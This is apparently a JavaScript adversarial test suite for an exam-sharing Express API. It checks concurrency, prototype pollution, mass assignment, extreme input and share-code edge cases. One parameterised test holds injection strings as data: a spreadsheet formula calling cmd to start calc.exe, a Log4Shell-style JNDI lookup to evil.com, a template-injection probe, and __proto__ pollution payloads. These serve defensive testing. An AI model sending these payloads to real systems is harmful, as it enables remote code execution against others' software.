process.env.EXAM_DB_PATH = ':memory:';

const express = require('express');
const request = require('supertest');
const { getDb, closeDb } = require('../../backend/database');
const examRoutes = require('../../backend/routes/examRoutes');
const { errorHandler } = require('../../backend/errorHandler');

/**
 * Bo test "adversarial": khong chi kiem tra "input sai dinh dang" thong
 * thuong, ma con fuzz/tan cong co chu dich - race condition, prototype
 * pollution, mass assignment, unicode cuc bien, payload khong lo, sai
 * Content-Type/HTTP verb, gia tri so am/vo cuc, share_code doc hai...
 */
function buildApp() {
  const app = express();
  app.use(express.json({ limit: '5mb' }));
  app.use('/api/exams', examRoutes);
  app.use(errorHandler);
  return app;
}

function mcqQuestion(overrides = {}) {
  return {
    question_type: 'MCQ',
    content: 'Cau hoi mac dinh?',
    difficulty_level: 'NB',
    correct_answer: 'A',
    options: [
      { option_key: 'A', option_text: '1', is_correct: true },
      { option_key: 'B', option_text: '2', is_correct: false }
    ],
    ...overrides
  };
}

function examPayload(overrides = {}) {
  return {
    title: 'De adversarial',
    blocks: [{ block_type: 'MULTIPLE_CHOICE', questions: [mcqQuestion()] }],
    ...overrides
  };
}

let consoleErrorSpy;
beforeAll(() => { consoleErrorSpy = jest.spyOn(console, 'error').mockImplementation(() => {}); });
afterAll(() => { consoleErrorSpy.mockRestore(); });
afterEach(async () => { await closeDb(); });

// -------------------------------------------------------------------------
// A. RACE CONDITION / CONCURRENCY
// -------------------------------------------------------------------------
describe('Race condition: nhieu request /save chay dong thoi', () => {
  test('TC-ADV-01 [Critical - da sua]: 20 request POST /save dong thoi deu thanh cong, khong dan xen du lieu, server khong crash', async () => {
    // Truoc khi sua: ung dung dung 1 ket noi SQLite dung chung, va 2 request
    // /save chay dong thoi se cung goi BEGIN TRANSACTION xen ke nhau tren
    // cung 1 ket noi -> SQLite nem "cannot start a transaction within a
    // transaction". ROLLBACK sau do CUNG that bai (khong co giao dich nao
    // dang mo cho RIENG request nay) va thoat khoi try/catch thanh mot
    // unhandled promise rejection - LAM SAP TOAN BO TIEN TRINH NODE (da xac
    // nhan thuc te bang script doc lap ngoai Jest, xem lich su sua doi).
    // Sau khi sua (backend/mutex.js + withLock() trong examRoutes.js), cac
    // giao dich duoc xep hang tuan tu tren cung 1 ket noi.
    const app = buildApp();
    const N = 20;

    const responses = await Promise.all(
      Array.from({ length: N }, (_, n) =>
        request(app).post('/api/exams/save').send(examPayload({
          title: `Exam-${n}`,
          blocks: [{
            block_type: 'MULTIPLE_CHOICE',
            questions: Array.from({ length: 5 }, (_, i) => mcqQuestion({ content: `Q${i} cua de ${n}` }))
          }]
        }))
      )
    );

    responses.forEach(res => {
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
    });

    // Doc lai tung de, xac nhan KHONG co du lieu bi tron lan giua cac request.
    for (let n = 0; n < N; n++) {
      const examId = responses[n].body.exam_id;
      const getRes = await request(app).get(`/api/exams/${examId}`);
      const exam = getRes.body.exam;
      expect(exam.title).toBe(`Exam-${n}`);
      const allQuestions = exam.blocks.flatMap(b => b.questions);
      expect(allQuestions).toHaveLength(5);
      expect(allQuestions.every(q => q.content.includes(`de ${n}`))).toBe(true);
    }
  }, 20000);

  test('TC-ADV-02: 10 request /save xen ke voi 10 request /share dong thoi khong lam crash server', async () => {
    const app = buildApp();

    const saveResponses = await Promise.all(
      Array.from({ length: 10 }, () => request(app).post('/api/exams/save').send(examPayload()))
    );
    saveResponses.forEach(res => expect(res.status).toBe(200));

    const mixedResponses = await Promise.all(
      saveResponses.flatMap((res, i) => [
        request(app).post('/api/exams/save').send(examPayload({ title: `Extra-${i}` })),
        request(app).post('/api/exams/share').send({ exam_id: res.body.exam_id })
      ])
    );
    mixedResponses.forEach(res => {
      expect([200, 404]).toContain(res.status);
    });
  }, 20000);
});

// -------------------------------------------------------------------------
// B. PROTOTYPE POLLUTION
// -------------------------------------------------------------------------
describe('Prototype pollution', () => {
  test('TC-ADV-03: body chua "__proto__" o cap cao nhat khong lam o nhiem Object.prototype toan cuc', async () => {
    const app = buildApp();
    const maliciousPayload = JSON.parse(
      `{"title":"De co proto","blocks":[{"block_type":"MULTIPLE_CHOICE","questions":[{"question_type":"MCQ","content":"x","options":[{"option_key":"A","option_text":"1"},{"option_key":"B","option_text":"2"}]}]}],"__proto__":{"polluted_marker_adv03":true}}`
    );

    await request(app).post('/api/exams/save').send(maliciousPayload);

    expect({}.polluted_marker_adv03).toBeUndefined();
    expect(Object.prototype.polluted_marker_adv03).toBeUndefined();
  });

  test('TC-ADV-04: title/content chua chuoi "__proto__" hoac "constructor.prototype" duoc luu nhu van ban thuong, khong bi dien giai', async () => {
    const app = buildApp();
    const res = await request(app).post('/api/exams/save').send(examPayload({
      title: '__proto__',
      blocks: [{
        block_type: 'MULTIPLE_CHOICE',
        questions: [mcqQuestion({ content: 'a.constructor.prototype.polluted = true; //' })]
      }]
    }));
    expect(res.status).toBe(200);

    const getRes = await request(app).get(`/api/exams/${res.body.exam_id}`);
    expect(getRes.body.exam.title).toBe('__proto__');
    expect(getRes.body.exam.blocks[0].questions[0].content).toBe('a.constructor.prototype.polluted = true; //');
    expect({}.polluted).toBeUndefined();
  });
});

// -------------------------------------------------------------------------
// C. INJECTION-STYLE CONTENT (formula injection, khong duoc "thuc thi")
// -------------------------------------------------------------------------
describe('Noi dung dang cong thuc/injection duoc luu nguyen van', () => {
  test.each([
    '=cmd|\'/c calc.exe\'!A1',
    '+1+1',
    '-2+3+cmd|\' /c calc\'!A1',
    '@SUM(1,2,3)',
    '${jndi:ldap://evil.com/a}',
    '{{7*7}}'
  ])('TC-ADV-05: noi dung cau hoi la "%s" duoc luu/tra ve nguyen van, khong bi thuc thi/noi suy', async (payload) => {
    const app = buildApp();
    const res = await request(app).post('/api/exams/save').send(examPayload({
      blocks: [{ block_type: 'MULTIPLE_CHOICE', questions: [mcqQuestion({ content: payload })] }]
    }));
    const getRes = await request(app).get(`/api/exams/${res.body.exam_id}`);
    expect(getRes.body.exam.blocks[0].questions[0].content).toBe(payload);
  });
});

// -------------------------------------------------------------------------
// D. UNICODE / CHUOI CUC BIEN
// -------------------------------------------------------------------------
describe('Unicode va chuoi cuc bien', () => {
  test('TC-ADV-06: emoji, chu Han, chu A-rap (RTL) duoc luu/doc lai chinh xac tung byte (round-trip UTF-8)', async () => {
    const app = buildApp();
    const weirdContent = '😀🎉 你好世界 مرحبا بالعالم Việt Nam ăâêôơư 🚀';
    const res = await request(app).post('/api/exams/save').send(examPayload({
      blocks: [{ block_type: 'MULTIPLE_CHOICE', questions: [mcqQuestion({ content: weirdContent })] }]
    }));
    const getRes = await request(app).get(`/api/exams/${res.body.exam_id}`);
    expect(getRes.body.exam.blocks[0].questions[0].content).toBe(weirdContent);
  });

  test('TC-ADV-07: noi dung rat dai (100,000 ky tu) duoc luu/doc lai day du, khong bi cat bot', async () => {
    const app = buildApp();
    const longContent = 'A'.repeat(100000);
    const res = await request(app).post('/api/exams/save').send(examPayload({
      blocks: [{ block_type: 'MULTIPLE_CHOICE', questions: [mcqQuestion({ content: longContent })] }]
    }));
    expect(res.status).toBe(200);
    const getRes = await request(app).get(`/api/exams/${res.body.exam_id}`);
    expect(getRes.body.exam.blocks[0].questions[0].content).toHaveLength(100000);
  });

  test('TC-ADV-08 [Ghi nhan hanh vi]: ky tu null byte (\\u0000) trong noi dung khong lam crash request', async () => {
    const app = buildApp();
    const contentWithNull = 'truoc sau';
    const res = await request(app).post('/api/exams/save').send(examPayload({
      blocks: [{ block_type: 'MULTIPLE_CHOICE', questions: [mcqQuestion({ content: contentWithNull })] }]
    }));
    // Ghi nhan hanh vi thuc te (SQLite/Node co the giu nguyen hoac xu ly
    // khac null byte tuy driver) - dieu quan trong nhat la KHONG crash.
    expect(res.status).toBe(200);
    const getRes = await request(app).get(`/api/exams/${res.body.exam_id}`);
    expect(getRes.status).toBe(200);
  });
});

// -------------------------------------------------------------------------
// E. MASS ASSIGNMENT
// -------------------------------------------------------------------------
describe('Mass assignment', () => {
  test('TC-ADV-09: client tu gui "exam_id" trong body KHONG the ghi de UUID do server sinh ra', async () => {
    const app = buildApp();
    const res = await request(app).post('/api/exams/save').send(examPayload({
      exam_id: 'attacker-chosen-id',
      created_at: '1999-01-01'
    }));
    expect(res.status).toBe(200);
    expect(res.body.exam_id).not.toBe('attacker-chosen-id');
    expect(res.body.exam_id).toMatch(/^[0-9a-f-]{36}$/);

    const getRes = await request(app).get('/api/exams/attacker-chosen-id');
    expect(getRes.status).toBe(404); // ID gia mao khong ton tai
  });
});

// -------------------------------------------------------------------------
// F. SAI CONTENT-TYPE / HTTP VERB
// -------------------------------------------------------------------------
describe('Sai Content-Type / HTTP verb', () => {
  test('TC-ADV-10: gui JSON voi Content-Type sai (text/plain) khong lam crash, tra ve 400 co kiem soat', async () => {
    const app = buildApp();
    const res = await request(app)
      .post('/api/exams/save')
      .set('Content-Type', 'text/plain')
      .send(JSON.stringify(examPayload()));
    // express.json() khong parse body vi sai Content-Type -> req.body rong
    // -> route tu choi vi thieu "title", khong crash.
    expect(res.status).toBe(400);
  });

  test('TC-ADV-11: goi sai phuong thuc HTTP (GET thay vi POST) len /save tra ve 404, khong crash', async () => {
    const app = buildApp();
    const res = await request(app).get('/api/exams/save');
    expect(res.status).toBe(404);
  });

  test('TC-ADV-11b: goi PUT/PATCH len cac endpoint hien co deu tra ve 404 (khong dinh nghia), khong crash', async () => {
    const app = buildApp();
    const res1 = await request(app).put('/api/exams/save').send(examPayload());
    const res2 = await request(app).patch('/api/exams/some-id');
    expect(res1.status).toBe(404);
    expect(res2.status).toBe(404);
  });
});

// -------------------------------------------------------------------------
// G. SHARE_CODE BIEN / DOC HAI
// -------------------------------------------------------------------------
describe('share_code bien va doc hai', () => {
  test('TC-ADV-12: share_code cuc dai (10,000 ky tu) khong lam crash/treo, tra ve 404 nhanh', async () => {
    const app = buildApp();
    const hugeCode = 'a'.repeat(10000);
    const start = Date.now();
    const res = await request(app).get(`/api/exams/shared/${hugeCode}`);
    const elapsed = Date.now() - start;
    expect(res.status).toBe(404);
    expect(elapsed).toBeLessThan(2000); // khong co dau hieu ReDoS/treo
  });

  test('TC-ADV-13: share_code chua ky tu dai dien SQL LIKE (%, _) duoc so khop CHINH XAC (khong phai pattern)', async () => {
    const app = buildApp();
    const saveRes = await request(app).post('/api/exams/save').send(examPayload());
    const shareRes = await request(app).post('/api/exams/share').send({ exam_id: saveRes.body.exam_id });
    const realCode = shareRes.body.share_code;

    // "%" va "_" trong SQL LIKE la wildcard, nhung route dung so sanh "="
    // (khong phai LIKE) nen phai KHONG khop bat ky gia tri nao khac.
    // Dung "%25" (ma hoa URL hop le cua ky tu "%") vi mot dau "%" tho khong
    // theo sau boi 2 chu so hex se khien chinh Express bao "URI malformed"
    // truoc ca khi vao duoc route - do la hanh vi bao ve san co cua Express,
    // khong phai dieu dang kiem thu o day.
    const res = await request(app).get('/api/exams/shared/%25');
    expect(res.status).toBe(404);
    const res2 = await request(app).get(`/api/exams/shared/${realCode.slice(0, -1)}_`);
    expect(res2.status).toBe(404);
  });

  test('TC-ADV-13b [Ghi nhan hanh vi]: dau "%" tho (URI khong hop le) trong URL bi Express tu choi truoc khi vao route, van tra ve JSON co kiem soat qua errorHandler, khong crash', async () => {
    const app = buildApp();
    const res = await request(app).get('/api/exams/shared/%');
    expect(res.status).toBe(500); // Express nem loi decodeURIComponent truoc khi den route handler
    expect(res.body).toEqual({ success: false, error: expect.any(String) });
  });

  test('TC-ADV-14: xoa share voi ma trong (DELETE /api/exams/share/) khop route khac hoac 404, khong crash', async () => {
    const app = buildApp();
    const res = await request(app).delete('/api/exams/share/');
    expect([404]).toContain(res.status);
  });
});

// -------------------------------------------------------------------------
// H. GIA TRI SO BIEN / AM / QUA LON
// -------------------------------------------------------------------------
describe('Gia tri so bien', () => {
  test('TC-ADV-15 [Ghi nhan hanh vi]: expires_in_days am tao ra link da het han ngay tu luc tao', async () => {
    const app = buildApp();
    const saveRes = await request(app).post('/api/exams/save').send(examPayload());
    const shareRes = await request(app)
      .post('/api/exams/share')
      .send({ exam_id: saveRes.body.exam_id, expires_in_days: -5 });
    expect(shareRes.status).toBe(200);

    const getRes = await request(app).get(`/api/exams/shared/${shareRes.body.share_code}`);
    expect(getRes.status).toBe(410); // da het han vi expires_at nam trong qua khu
  });

  test('TC-ADV-16 [Ghi nhan hanh vi]: draft_lines_count cuc lon (1,000,000) van duoc luu, khong crash server', async () => {
    const app = buildApp();
    const res = await request(app).post('/api/exams/save').send(examPayload({
      blocks: [{
        block_type: 'ESSAY',
        questions: [{ question_type: 'ESSAY', content: 'x', draft_lines_count: 1000000 }]
      }]
    }));
    expect(res.status).toBe(200);
    const getRes = await request(app).get(`/api/exams/${res.body.exam_id}`);
    expect(getRes.body.exam.blocks[0].questions[0].draft_lines_count).toBe(1000000);
  });

  test('TC-ADV-17 [Da sua]: MCQ co 2 lua chon trung option_key (2 lan "A") bi validateExamPayload tu choi (400)', async () => {
    const app = buildApp();
    const res = await request(app).post('/api/exams/save').send(examPayload({
      blocks: [{
        block_type: 'MULTIPLE_CHOICE',
        questions: [mcqQuestion({
          options: [
            { option_key: 'A', option_text: '1' },
            { option_key: 'A', option_text: '2' }
          ]
        })]
      }]
    }));
    expect(res.status).toBe(400);
    expect(res.body.details[0]).toMatch(/trung option_key/);
  });
});

// -------------------------------------------------------------------------
// I. HIEU NANG / PAYLOAD LON
// -------------------------------------------------------------------------
describe('Payload lon', () => {
  test('TC-ADV-18: de thi co 200 cau hoi trong 1 block duoc luu va doc lai chinh xac trong thoi gian hop ly', async () => {
    const app = buildApp();
    const bigBlock = {
      block_type: 'MULTIPLE_CHOICE',
      questions: Array.from({ length: 200 }, (_, i) => mcqQuestion({ content: `Cau so ${i}` }))
    };

    const start = Date.now();
    const res = await request(app).post('/api/exams/save').send(examPayload({ blocks: [bigBlock] }));
    const saveElapsed = Date.now() - start;
    expect(res.status).toBe(200);
    expect(saveElapsed).toBeLessThan(15000);

    const getRes = await request(app).get(`/api/exams/${res.body.exam_id}`);
    expect(getRes.body.exam.blocks[0].questions).toHaveLength(200);
    expect(getRes.body.exam.blocks[0].questions[199].content).toBe('Cau so 199');
  }, 20000);
});
